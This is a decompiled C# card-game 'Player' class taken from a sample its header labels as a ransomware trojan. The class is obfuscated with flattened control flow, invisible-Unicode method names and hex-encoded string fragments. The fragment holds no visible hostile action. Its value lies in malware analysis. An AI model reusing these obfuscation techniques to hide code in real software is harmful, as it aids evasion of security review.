// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: IOExcepti, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 72674A88-3F84-4927-9D84-82118D6CBF01
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-49811dca565bead069108819f9ad132a2214364381f97dcf7f0f439614cc8ff4.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
label_1:
      int num1 = -1927334986;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -917445178)) % 12U)
        {
          case 0:
            num1 = (int) num2 * 377489617 ^ -168508140;
            continue;
          case 1:
            str2 = str1;
            num1 = -2107387666;
            continue;
          case 2:
            goto label_1;
          case 3:
            str1 = "37436633656949";
            num1 = (int) num2 * -1096282220 ^ -1135175921;
            continue;
          case 4:
            int num3;
            num1 = num3 = BaseStream == 1 ? -523360189 : (num3 = -877818541);
            continue;
          case 5:
            num1 = (int) num2 * -677640158 ^ 2060848993;
            continue;
          case 7:
            num1 = (int) num2 * -1125768153 ^ 628414232;
            continue;
          case 8:
            flag = BaseStream == 0;
            num1 = (int) num2 * 1280428300 ^ 252730600;
            continue;
          case 9:
            num1 = (int) num2 * 934093932 ^ -915571439;
            continue;
          case 10:
            int num4 = !flag ? 610063870 : (num4 = 1436563401);
            num1 = num4 ^ (int) num2 * -1743844596;
            continue;
          case 11:
            str1 = "5461736B457863657074696F6E486F6C64";
            num1 = (int) num2 * -152037503 ^ -1765933088;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -241166827;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -1641693764)) % 4U)
        {
          case 0:
            num4 = 0;
            break;
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * 1727444087 ^ -905386985;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 2:
            goto label_1;
          default:
            goto label_8;
        }
        num2 = num4;
        num1 = -1619019785;
      }
label_8:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = -872415775;
        int num2;
        int[] planningCards;
        int index;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ -252839123)) % 11U)
          {
            case 0:
              goto label_1;
            case 1:
              int num5;
              num1 = num5 = index < planningCards.Length ? -521531203 : (num5 = -1204701487);
              continue;
            case 2:
              num3 = planningCards[index];
              num1 = -1087500814;
              continue;
            case 3:
              num1 = (int) num4 * -416132957 ^ 1825435307;
              continue;
            case 4:
              ++index;
              num1 = -1830598523;
              continue;
            case 6:
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num4 * 537312235 ^ -674890214;
              continue;
            case 7:
              planningCardsCount = num2;
              num1 = (int) num4 * 684954827 ^ 293545352;
              continue;
            case 8:
              num2 = 0;
              num1 = (int) num4 * 236601877 ^ -889659336;
              continue;
            case 9:
              int num6 = num3 <= 0 ? -1438745426 : (num6 = -1342438559);
              num1 = num6 ^ (int) num4 * 1473926474;
              continue;
            case 10:
              ++num2;
              num1 = (int) num4 * 817803043 ^ -95588042;
              continue;
            default:
              goto label_12;
          }
        }
label_12:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 1622116953;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 767917037)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1604515224 ^ -1422398074;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
      int index = 0;
label_1:
      int num1 = 246025321;
      int planningCard;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1731639954)) % 13U)
        {
          case 0:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * 1325449171 ^ 1652353689;
            continue;
          case 1:
            num1 = (int) num2 * -1288688607 ^ -1820887197;
            continue;
          case 2:
            num1 = (int) num2 * -101759043 ^ -41618934;
            continue;
          case 4:
            int num3 = planningCard == 0 ? 744005512 : (num3 = 962510048);
            num1 = num3 ^ (int) num2 * -50434773;
            continue;
          case 5:
            num1 = (int) num2 * 1550217713 ^ -715818969;
            continue;
          case 6:
            num1 = (int) num2 * -1038908277 ^ 981129636;
            continue;
          case 7:
            int num4;
            num1 = num4 = index < this.PlanningCards.Length ? 1857294203 : (num4 = 1203809119);
            continue;
          case 8:
            goto label_1;
          case 9:
            ++index;
            num1 = 1612346732;
            continue;
          case 10:
            str2 = str1;
            num1 = (int) num2 * 698725839 ^ -1811989117;
            continue;
          case 11:
            str1 = Player.\u206B‫⁬‍⁭‎‮​‏⁬⁭‬⁯⁫⁪⁪‌‏⁮‍‌⁮⁭⁮⁪‍⁮⁪‌‬‎‍⁪‌⁭⁫‍⁮⁯‎‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 386933668;
            continue;
          case 12:
            num1 = 562506608;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = -677978402;
      int[] numArray;
      int aIndex;
      bool flag;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1722503444)) % 10U)
        {
          case 0:
            num1 = (int) num2 * -413832372 ^ -334734284;
            continue;
          case 1:
            planningCards = numArray;
            num1 = (int) num2 * -1504073685 ^ 931707183;
            continue;
          case 2:
            goto label_1;
          case 3:
            ++aIndex;
            num1 = (int) num2 * 42763844 ^ 583838965;
            continue;
          case 4:
            numArray = new int[count];
            num1 = (int) num2 * -2053772637 ^ -1892959166;
            continue;
          case 5:
            int num3 = !flag ? 1198257061 : (num3 = 1350463697);
            num1 = num3 ^ (int) num2 * -1992708992;
            continue;
          case 7:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -1128670123;
            continue;
          case 8:
            aIndex = 0;
            num1 = (int) num2 * -147020356 ^ 1543065585;
            continue;
          case 9:
            flag = aIndex < count;
            num1 = -1450592435;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
      string str = Player.\u206F‌‫‎⁭‫‍‮‫⁫‌‮⁫​⁫⁬‪‫‏⁮⁯‬⁬⁫‬‭‭‫‫‏⁭⁮‬⁭⁮‮‬‪‬‮‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
label_1:
      int num1 = -303268744;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -565203276)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -115283310 ^ 1558918391;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u206B‫⁬‍⁭‎‮​‏⁬⁭‬⁯⁫⁪⁪‌‏⁮‍‌⁮⁭⁮⁪‍⁮⁪‌‬‎‍⁪‌⁭⁫‍⁮⁯‎‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206F‌‫‎⁭‫‍‮‫⁫‌‮⁫​⁫⁬‪‫‏⁮⁯‬⁬⁫‬‭‭‫‫‏⁭⁮‬⁭⁮‮‬‪‬‮‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
